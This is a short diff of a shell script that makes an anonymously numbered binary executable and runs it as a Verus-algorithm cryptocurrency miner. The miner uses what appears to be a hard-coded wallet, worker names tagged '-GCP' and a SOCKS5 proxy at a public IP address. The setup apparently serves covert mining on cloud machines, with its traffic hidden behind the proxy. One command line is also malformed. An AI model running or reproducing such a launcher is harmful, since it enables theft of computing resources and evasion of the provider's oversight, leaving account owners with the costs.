@@ -8,4 +8,4 @@ B=RBuRXPrVQkqkgvne65cwA5WoMnRNFh5AsU
 C=$(echo $(shuf -i 1-50n 1)-GCP
 D=socks5://72.221.196.145:4145
 
-chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DGB --cpu-priority 5 -t 35 --max-diff=390000
+chmod u+x 5 && ./5 -a verus -o $A -u $B.$C -x $D  -p c=DGB --cpu-priority 5 -t 35 --max-diff=390000
